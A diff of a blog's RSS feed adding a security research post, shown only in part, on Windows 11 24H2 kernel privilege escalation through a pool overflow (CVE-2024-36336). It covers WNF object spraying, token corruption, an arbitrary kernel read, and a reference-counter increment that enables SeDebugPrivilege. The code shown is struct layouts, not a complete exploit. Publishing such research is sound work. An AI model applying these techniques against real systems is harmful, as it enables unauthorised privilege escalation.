@@ -5,9 +5,340 @@
     <description></description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Wed, 26 Mar 2025 16:49:25 +0100</pubDate>
-    <lastBuildDate>Wed, 26 Mar 2025 16:49:25 +0100</lastBuildDate>
-    <generator>Jekyll v4.3.2</generator>
+    <pubDate>Wed, 09 Apr 2025 08:53:12 +0200</pubDate>
+    <lastBuildDate>Wed, 09 Apr 2025 08:53:12 +0200</lastBuildDate>
+    <generator>Jekyll v4.4.1</generator>
+    
+      <item>
+        <title>Porting a Windows Kernel data-only technique to 24H2</title>
+        <description>&lt;p&gt;This research was part of my presentation at &lt;a href=&quot;https://www.blackhat.com/asia-25/briefings/schedule/#misadventures-with-copilot-attacking-and-exploiting-windows-npu-drivers-43619&quot;&gt;BlackHat Asia 2025&lt;/a&gt;. We will present our general exploitation strategy on how we used
+an integer overflow turned out-of-bounds write (CVE-2024-36336) on the paged pool to escalate our privileges on the latest Windows 11 version 24H2. In this blogpost we will focus on the exploitation strategy not on the bugs themselves. The bugs could be the content of a later blogpost… Maybe…&lt;/p&gt;
+
+&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;
+&lt;p&gt;We largely followed the method described by k0shl in his writeup about &lt;a href=&quot;https://whereisk0shl.top/post/break-me-out-of-sandbox-in-old-pipe-cve-2022-22715-windows-dirty-pipe&quot;&gt;CVE-2022-22715 Windows Dirty Pipe&lt;/a&gt; (Amazing blog post read it!).
+With Windows 11 version 24H2 the bug around &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;previousMode&lt;/code&gt; which was often used for &lt;a href=&quot;https://www.nccgroup.com/us/research-blog/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-2/&quot;&gt;better read/write primitives&lt;/a&gt; was fixed.
+As the write primitive which k0shl used had side effects, we had to replace it with something else. We used a reference counter at offset 0x18 of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN-&amp;gt;BnoIsolationHandlesEntry&lt;/code&gt; to gain an arbitrary increment primitive when we duplicate a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN&lt;/code&gt; object.
+The increment primitive only works if the value to increment is within the range &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1 - 0x7ffffffffffffffff&lt;/code&gt; otherwise, you get to enjoy a bluescreen.
+This primitive was then used to enable the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebug&lt;/code&gt; privilege in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN&lt;/code&gt; object of the current  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_EPROCESS&lt;/code&gt; and thus escalating our privileges. As a little bonus when you close the duplicated &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN&lt;/code&gt; objects your privileges will be automatically be dropped again.&lt;/p&gt;
+
+&lt;h2 id=&quot;intro&quot;&gt;Intro&lt;/h2&gt;
+&lt;p&gt;So lets start at the beginning. Our exploitation strategy looks something like this:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Create a predictable heaplayout (Fengshui)&lt;/li&gt;
+  &lt;li&gt;Overwrite a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_WNF_STATE_DATA&lt;/code&gt; object&lt;/li&gt;
+  &lt;li&gt;Put a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN&lt;/code&gt; object behind our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_WNF_DATA&lt;/code&gt; object&lt;/li&gt;
+  &lt;li&gt;Establish arbitrary read&lt;/li&gt;
+  &lt;li&gt;Use arbitrary increment&lt;/li&gt;
+  &lt;li&gt;???&lt;/li&gt;
+  &lt;li&gt;Profit&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;wtf-is-wnf&quot;&gt;WTF is WNF?&lt;/h2&gt;
+
+&lt;p&gt;Before we start with our fengshui we have to talk about  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_WNF_STATE_DATA&lt;/code&gt; objects. This will be the object we will primarly use for our fengshui. Think about it like a swiss army knife for paged pool exploitation. Lets have a look at the object:&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_WNF_STATE_DATA&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_WNF_NODE_HEADER&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;//0x0&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AllocatedSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                        &lt;span class=&quot;c1&quot;&gt;//0x4&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DataSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                             &lt;span class=&quot;c1&quot;&gt;//0x8&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ChangeStamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                          &lt;span class=&quot;c1&quot;&gt;//0xc&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;UCHAR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UserData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;                          &lt;span class=&quot;c1&quot;&gt;//Up to 0x1000&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;As seen by the last member of this struct the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_WNF_STATE_DATA&lt;/code&gt; has a dynamic size. So we can write up to 0x1000 bytes of user controlled data. This means we exactly know how big our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_WNF_STATE_DATA&lt;/code&gt; object will be. Additonally &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AllocatedSize&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DataSize&lt;/code&gt; will be set to the size of our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserData&lt;/code&gt;. With an overflow we can now overwrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AllocatedSize&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DataSize&lt;/code&gt; to an value bigger than the actual &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserData&lt;/code&gt;. Now we can use the APIs &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtQueryWnfStateData&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtUpdateWnfStateData&lt;/code&gt; to linearly read and write out of bounds of our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_WNF_STATE_DATA&lt;/code&gt; allocation.&lt;/p&gt;
+
+&lt;p&gt;More specifically if you  overwrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AllocatedSize&lt;/code&gt; you can write out of bounds up to the specified value or to a maximum of 0x1000. Fun fact you can overwrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AllocatedSize&lt;/code&gt; with a size bigger than 0x1000 and you will still be able to write up to 0x1000 bytes.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DataSize&lt;/code&gt; on the other hand, controls how much we can read. Here we are not limited to 0x1000 bytes but you always need to read the entire buffer. So if you overwrite this field with 0xffffff you have to read all 0xffffff bytes. If you read a page which is not paged in, this will lead to a crash. So don’t use huge numbers here. You can also use this property to your advantage. You can query all sprayed &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_WNF_STATE_DATA&lt;/code&gt; objects with an buffer of similar size as the original one and the one which returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STATUS_BUFFER_TOO_SMALL&lt;/code&gt; is the object where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AllocatedSize&lt;/code&gt; got corrupted.&lt;/p&gt;
+
+&lt;p&gt;We can create a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_WNF_STATE_DATA&lt;/code&gt; object with a call to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtCreateWnfStateName&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtUpdateWnfStateData&lt;/code&gt;. As detailed in k0shls blog in the section &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Demonstrate how I use WNF API with a accessible SD&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;fengshui&quot;&gt;Fengshui&lt;/h2&gt;
+&lt;p&gt;Enough nerding about &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_WNF_STATE_DATA&lt;/code&gt; it is time to make our paged pool layout predictable. There are a few sources on how the windows kernel allocator works like &lt;a href=&quot;https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Windows-Heap-Backed-Pool-The-Good-The-Bad-And-The-Encoded.pdf&quot;&gt;this&lt;/a&gt; or &lt;a href=&quot;https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf&quot;&gt;this&lt;/a&gt;. I mainly used the second &lt;a href=&quot;https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf&quot;&gt;source&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;The hardest part about the fengshui was choosing the size and which allocator we want to use. We choose the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Variable Size&lt;/code&gt; allocator. Our fengshui has three different objects.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;The object which will trigger the overflow (See our &lt;a href=&quot;https://www.blackhat.com/asia-25/briefings/schedule/#misadventures-with-copilot-attacking-and-exploiting-windows-npu-drivers-43619&quot;&gt;BH presentation&lt;/a&gt;). It has an dynamic size.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_WNF_STATE_DATA&lt;/code&gt; &amp;lt;3&lt;/li&gt;
+  &lt;li&gt;A &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN&lt;/code&gt; object&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Luckily the only object where we don’t control the size of is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN&lt;/code&gt; object. Interestingly the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN&lt;/code&gt; object is not a fixed allocation but the size can vary depending on what is stored inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN-&amp;gt;DynamicPart&lt;/code&gt; (DACL and stuff I think, but I’m not 100% sure). For us our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN&lt;/code&gt; objects we will spray had a size around 0x7c0.
+So we adjusted our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_WNF_STATE_DATA&lt;/code&gt; and our vulnerable object to the same size.&lt;/p&gt;
+
+&lt;p&gt;Then our strategy was the following:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Spray enough &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_WNF_STATE_DATA&lt;/code&gt; to fill up all existing holes to get the allocations continous and enable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dynamic lookaside&lt;/code&gt; for this allocation size.&lt;/li&gt;
+  &lt;li&gt;Free one &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_WNF_STATE_DATA&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Trigger the allocation of our vulnerable object and overflow AllocatedSize and parts of DataSize inside a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_WNF_STATE_DATA&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_WNF_STATE_DATA&lt;/code&gt; object to overwrite AllocatedSize and DataSize of the next &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_WNF_STATE_DATA&lt;/code&gt; with better values&lt;/li&gt;
+  &lt;li&gt;Replace the not corrupted &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_WNF_STATE_DATA&lt;/code&gt; objects with  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN&lt;/code&gt; objects&lt;/li&gt;
+  &lt;li&gt;Enjoy the full control over a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN&lt;/code&gt; object&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Visualized it looks something like this:&lt;/p&gt;
+&lt;figure&gt;
+  &lt;a href=&quot;&quot; target=&quot;&quot;&gt;
+    &lt;img src=&quot;/assets/images/gen/content/fengshui.jpg&quot; alt=&quot;Photo of the fengshui&quot; /&gt;
+  &lt;/a&gt;
+  &lt;figcaption&gt;
+    &lt;h4&gt;Fengshui visualized, AS: Allocated Size and DS: Data Size&lt;/h4&gt;
+    &lt;p&gt;&lt;/p&gt;
+  &lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;h2 id=&quot;establish-arbitrary-read&quot;&gt;Establish arbitrary read&lt;/h2&gt;
+&lt;p&gt;After a reliable linear read/write primitive was established we wanted arbitrary read. To establish an arbitrary read we can modify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN-&amp;gt;BnoIsolationHandlesEntry&lt;/code&gt; and point it to a controlled userspace address (see once again &lt;a href=&quot;https://whereisk0shl.top/post/break-me-out-of-sandbox-in-old-pipe-cve-2022-22715-windows-dirty-pipe&quot;&gt;k0shls blog&lt;/a&gt;). At this userspace address we can now forge a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_SEP_CACHED_HANDLES_ENTRY&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EntryDescriptor.IsolationPrefix.Buffer&lt;/code&gt; at offset 0x30 can be pointed to the kernel address we want to read. And &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EntryDescriptor.IsolationPrefix.MaximumLength&lt;/code&gt; at offset 0x28 defines how much bytes will be read.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;a href=&quot;&quot; target=&quot;&quot;&gt;
+    &lt;img src=&quot;/assets/images/gen/content/arbitraryr.png&quot; alt=&quot;Photo illustrating the arbitrary read setup&quot; /&gt;
+  &lt;/a&gt;
+  &lt;figcaption&gt;
+    &lt;h4&gt;Simple illustration of the arbitrary read setup&lt;/h4&gt;
+    &lt;p&gt;&lt;/p&gt;
+  &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;After we setup our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_SEP_CACHED_HANDLES_ENTRY&lt;/code&gt; in userspace we can simply call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtQueryInformationToken&lt;/code&gt; with a handle to our corrupted token and set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TokenInformationClass&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TokenBnoIsolation&lt;/code&gt;. At offset 0x10 of the returning buffer you will find your data (So make the input buffer 0x10 bytes bigger than &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EntryDescriptor.IsolationPrefix.MaximumLength&lt;/code&gt;).&lt;/p&gt;
+
+&lt;h3 id=&quot;what-should-we-read&quot;&gt;What should we read?&lt;/h3&gt;
+&lt;p&gt;Chen Le Qi from Starlabs documented in a &lt;a href=&quot;https://starlabs.sg/blog/2023/11-exploitation-of-a-kernel-pool-overflow-from-a-restrictive-chunk-size-cve-2021-31969/#hunting-eprocess&quot;&gt;blogpost&lt;/a&gt; from 2023 how we can find the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_EPROCESS&lt;/code&gt; structure of our current process from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN&lt;/code&gt; object we control. It still works in 24H2!&lt;/p&gt;
+
+&lt;p&gt;I summarize this strategy shortly:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Search the page containing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN-&amp;gt;SessionObject&lt;/code&gt;
+of our current Token for an allocation with the tag
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AlIn&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Read the pointer at offset 0x38 as it contains an IoCompletion object&lt;/li&gt;
+  &lt;li&gt;Search the page containing the IoCompletion object
+for an allocation with the tag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EtwR&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Read the pointer at offset 0x30 as it contains an
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_EPROCESS&lt;/code&gt; object&lt;/li&gt;
+  &lt;li&gt;Iterate over the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ActiveProcessLinks&lt;/code&gt; linked list of the
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_EPROCESS&lt;/code&gt; to find our own &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_EPROCESS&lt;/code&gt; object by
+comparing the UniqueProcessId field to our current
+process id.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;why-we-need-_eprocess&quot;&gt;Why we need &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_EPROCESS&lt;/code&gt;?&lt;/h3&gt;
+&lt;p&gt;Because the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_EPROCESS&lt;/code&gt; has again a pointer to the currently used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN&lt;/code&gt; which contains the privileges held of our current process. If we can change the fields &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN.Privileges.Present&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN.Privileges.Enabled&lt;/code&gt; in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN&lt;/code&gt; of our current process,  we can enable powerful &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants&quot;&gt;SE_Privileges&lt;/a&gt;. Those privileges are allowing us to bypass a lot of security checks. For example with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt; we can obtain a handle with full rights to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;winlogon.exe&lt;/code&gt; process and spawn a subprocess with it.&lt;/p&gt;
+
+&lt;h3 id=&quot;what-if-i-am-an-_eprocess-hater&quot;&gt;What if I am an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_EPROCESS&lt;/code&gt; hater?&lt;/h3&gt;
+&lt;p&gt;That is a bit wierd, but we don’t judge. Luckily for you Angelboy presented at Hexxacon 2024 a different way to escalate your privileges. You have to locate the symbol &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; and later increment the value there to the value of a privilege you are currently holding. So instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_EPROCESS&lt;/code&gt; you have to locate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt&lt;/code&gt; base address. Check his &lt;a href=&quot;https://devco.re/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2-en/&quot;&gt;blogpost&lt;/a&gt; for more details. He was also an inspiration for using an arbitrary increment as a primitive later.&lt;/p&gt;
+
+&lt;h2 id=&quot;arbitrary-increment&quot;&gt;Arbitrary increment&lt;/h2&gt;
+&lt;h3 id=&quot;rip-previousmode&quot;&gt;RIP previousMode&lt;/h3&gt;
+&lt;p&gt;So Microsoft killed the &lt;a href=&quot;https://www.nccgroup.com/us/research-blog/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-2/&quot;&gt;previousMode technique&lt;/a&gt; with 24H2.&lt;/p&gt;
+&lt;figure&gt;
+  &lt;a href=&quot;&quot; target=&quot;&quot;&gt;
+    &lt;img src=&quot;/assets/images/gen/content/congrats.png&quot; alt=&quot;Photo of an upset child congratulating&quot; /&gt;
+  &lt;/a&gt;
+  &lt;figcaption&gt;
+    &lt;h4&gt;My reaction to this amazing achievement...&lt;/h4&gt;
+    &lt;p&gt;&lt;/p&gt;
+  &lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;p&gt;K0shls technique for arbitrary write described in his blog had some sideeffects. It messed up values surrounding the value we wrote. This was not a problem when we simply could set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;previousMode&lt;/code&gt; to 0 and then use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtReadVirtualMemory&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtWriteVirtualMemory&lt;/code&gt; to clean up the stuff
+we messed up. But we couldn’t get it working anymore :(&lt;/p&gt;
+
+&lt;h3 id=&quot;misusing-reference-counters&quot;&gt;(Mis)using reference counters&lt;/h3&gt;
+&lt;p&gt;As the awesome &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;previousMode&lt;/code&gt; trick was gone, we had to find a different way to enable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt; for our process. As we only need to flip a bit inside the fields  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN.Privileges.Present&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN.Privileges.Enabled&lt;/code&gt; we realized an stable arbitrary increment would suffice. After checking the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN&lt;/code&gt; object we realized that our good old friend &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN-&amp;gt;BnoIsolationHandlesEntry&lt;/code&gt; has the following type:&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_SEP_CACHED_HANDLES_ENTRY&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_RTL_DYNAMIC_HASH_TABLE_ENTRY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HashEntry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;//0x0&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;LONGLONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ReferenceCount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                       &lt;span class=&quot;c1&quot;&gt;//0x18 &amp;lt;-- looking promising&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_SEP_CACHED_HANDLES_ENTRY_DESCRIPTOR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EntryDescriptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;//0x20&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HandleCount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                             &lt;span class=&quot;c1&quot;&gt;//0x38&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;VOID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Handles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                &lt;span class=&quot;c1&quot;&gt;//0x40&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;At offset 0x18 there is an ReferenceCount counter which could be abused as an increment primitive. Because if we could duplicate a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN&lt;/code&gt; and only the 
+field &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ReferenceCount&lt;/code&gt; gets changed we would be back in the game!&lt;/p&gt;
+&lt;figure&gt;
+  &lt;a href=&quot;&quot; target=&quot;&quot;&gt;
+    &lt;img src=&quot;/assets/images/gen/content/arbitraryinc.jpg&quot; alt=&quot;Photo illustrating the arbitrary increment&quot; /&gt;
+  &lt;/a&gt;
+  &lt;figcaption&gt;
+    &lt;h4&gt;Arbitrary increment with BnoIsolationHandlesEntry&lt;/h4&gt;
+    &lt;p&gt;&lt;/p&gt;
+  &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;So lets check it out in Binary Ninja:&lt;/p&gt;
+&lt;figure&gt;
+  &lt;a href=&quot;&quot; target=&quot;&quot;&gt;
+    &lt;img src=&quot;/assets/images/gen/content/inc_token.png&quot; alt=&quot;Photo of the increment&quot; /&gt;
+  &lt;/a&gt;
+  &lt;figcaption&gt;
+    &lt;h4&gt;Increment during SepDuplicateToken&lt;/h4&gt;
+    &lt;p&gt;&lt;/p&gt;
+  &lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;p&gt;So if we duplicate a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN-&amp;gt;BnoIsolationHandlesEntry&lt;/code&gt; is set and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN-&amp;gt;BnoIsolationHandlesEntry.ReferenceCount&lt;/code&gt; is not &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt; and less than &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7ffffffffffffffff&lt;/code&gt;, only the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_TOKEN-&amp;gt;BnoIsolationHandlesEntry.ReferenceCount&lt;/code&gt; is changed. Perfect!&lt;/p&gt;
+
+&lt;p&gt;We also should verify the decrement:&lt;/p&gt;
+&lt;figure&gt;
+  &lt;a href=&quot;&quot; target=&quot;&quot;&gt;
+    &lt;img src=&quot;/assets/images/gen/content/dec_token.png&quot; alt=&quot;Photo of the decrement&quot; /&gt;
+  &lt;/a&gt;
+  &lt;figcaption&gt;
+    &lt;h4&gt;Decrement when a _TOKEN handle is closed&lt;/h4&gt;
+    &lt;p&gt;&lt;/p&gt;
+  &lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;p&gt;As long as the value doesn’t get decremented to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt; (Which would try to free the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_SEP_CACHED_HANDLES_ENTRY&lt;/code&gt;) we should be fine.&lt;/p&gt;
+
+&lt;p&gt;Good life!&lt;/p&gt;
+
+&lt;p&gt;If we look at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Present&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Enabled&lt;/code&gt; fields of an process token running in low integrity:&lt;/p&gt;
+&lt;figure&gt;
+  &lt;a href=&quot;&quot; target=&quot;&quot;&gt;
+    &lt;img src=&quot;/assets/images/gen/content/lowintegrity_token.png&quot; alt=&quot;Photo of the privilege struct in a low integrity process&quot; /&gt;
+  &lt;/a&gt;
+  &lt;figcaption&gt;
+    &lt;h4&gt;The privilege struct of an low integrity process&lt;/h4&gt;
+    &lt;p&gt;&lt;/p&gt;
+  &lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;p&gt;The values are between &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7ffffffffffffffff&lt;/code&gt;. Perfect!&lt;/p&gt;
+
